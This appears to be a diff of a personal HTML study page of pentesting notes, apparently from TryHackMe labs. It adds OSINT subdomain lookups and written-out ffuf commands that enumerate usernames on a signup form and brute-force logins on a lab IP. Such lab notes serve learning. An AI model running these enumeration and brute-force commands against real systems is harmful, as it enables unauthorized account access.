@@ -54,7 +54,16 @@
   <p><b>OSINT</b></p>
   <ol>Open subdomain SSL log: <a href="https://crt.sh">https://crt.sh</a> and <a href="https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</a></ol>
   <ol>Google dork: -site:www.tryhackme.com  site:*.tryhackme.com</ol>
-  <p><b>Virtual Host</b></p>
+  </div>
+  <div>
+    <h2><li>Authentication Bypass</li></h2>
+    <p><b>Brute Force</b></p>
+    <ol>ffuf tool:
+      <ol><b>username enumeration:</b> ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.240.195/customers/signup -mr "username already exists"<br>
+      <b>Explaination:</b> the <b>-w </b> for wordlist. The <b>-X </b>for request method,GET request by default. The <b>-d </b>for data.In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The<b> -H </b> for additional headers.The <b>-u</b> for URL, the <b>-mr</b> for error message.</ol><br>
+      <ol><b>Username & Password Brute-force: </b> ffuf -w [username_wordlist]:W1,[password_wordlist]:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [login_url] -fc 200</ol>
+    </ol>
+
   </div>
 </body>
-</html>
+</html>           
